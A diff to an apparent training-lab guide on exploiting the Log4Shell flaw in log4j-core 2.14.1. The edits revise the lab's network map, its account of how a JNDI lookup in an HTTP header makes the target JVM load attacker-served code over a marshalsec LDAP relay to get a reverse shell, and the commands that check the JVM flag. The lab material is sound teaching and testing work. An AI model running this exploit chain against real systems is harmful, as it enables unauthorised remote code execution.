@@ -75,7 +75,7 @@ ATTACKER NETWORK  10.0.0.0/24  (Docker bridge: attacker_net)
   10.0.0.20   dragonrx_jndi   marshalsec LDAP relay :1389 + Exploit.class HTTP server :8080
 
 TARGET NETWORK  192.168.10.0/24  (Docker bridge: target_net + VirtualBox bridged NICs)
-  10.0.0.100 / 192.168.10.100  dragonrx_web01  Spring Boot + log4j-core 2.14.1  :8080
+  10.0.0.100 / 192.168.10.100  dragonrx_web01  Tomcat 9.0.54 + log4j-core 2.14.1  :8080
   192.168.10.10                DC01            Windows Server 2019 — novatech.local DC
   192.168.10.20                FS01            Windows Server 2019 — SMB file server
   192.168.10.50                WS01            Windows 10 22H2 — jsmith workstation
@@ -214,9 +214,10 @@ Zeek logs connections to conn.log; no rule match.
 **What's happening:** Log4j 2 processes a JNDI lookup string (`${jndi:ldap://...}`) embedded in any
 logged value — in this case the `X-Api-Version` HTTP header. When Log4j sees this string, it initiates
 an outbound LDAP connection to the attacker-controlled relay (marshalsec). The relay redirects the
-victim JVM to download a Java class from the attacker's HTTP server. Since this JVM runs Java 8
-pre-u191 (`com.sun.jndi.ldap.object.trustURLCodebase=true`), it instantiates the downloaded class,
-executing its static initializer — which runs our reverse shell command.
+victim JVM to download a Java class from the attacker's HTTP server. The JVM runs Java 8 with `com.sun.jndi.ldap.object.trustURLCodebase=true` set as a JVM flag
+(required since JDK 8u191+ disables remote class loading by default — the lab Dockerfile sets it
+explicitly via `JAVA_OPTS`). It instantiates the downloaded class, executing its static initializer —
+which runs our reverse shell command.
 
 The `dragonrx_jndi` container handles the entire relay chain automatically:
 - marshalsec LDAP relay: `10.0.0.20:1389`
@@ -313,9 +314,13 @@ This log entry survives even if you delete bash history, kill the implant, or ov
 # Check the JNDI container caught the request
 docker logs dragonrx_jndi 2>&1 | tail -10
 
-# Confirm WEB01 JVM version (must be Java 8 pre-u191 for remote classloading)
+# Confirm WEB01 JVM version and trustURLCodebase flag
 docker exec dragonrx_web01 java -version 2>&1
-# Expected: openjdk version "1.8.0_xxx" — where xxx < 191
+# Expected: openjdk version "1.8.0_xxx" (any patch — lab sets trustURLCodebase=true via JAVA_OPTS)
+
+# Confirm the JVM flag is set in the running Tomcat process
+docker exec dragonrx_web01 ps aux | grep -o 'trustURLCodebase=[^ ]*'
+# Expected: trustURLCodebase=true
 ```
 
 ```bash
